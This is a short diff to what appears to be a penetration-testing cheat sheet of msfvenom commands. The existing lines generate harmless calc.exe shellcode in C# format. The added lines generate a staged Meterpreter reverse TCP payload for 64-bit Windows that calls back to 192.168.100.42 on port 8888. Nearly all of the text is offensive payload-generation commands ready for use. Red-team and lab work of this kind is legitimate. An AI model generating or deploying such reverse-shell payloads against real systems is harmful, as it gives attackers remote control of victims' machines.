@@ -5,3 +5,6 @@ msfvenom -p windows/x64/exec CMD="calc.exe" -f csharp
 
 # generate shellcode to execute calc.exe on x86
 msfvenom -p windows/exec CMD="calc.exe" -f csharp
+
+# generate x64 staged meterpreter reverse tcp payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.42 LPORT=8888 -f csharp
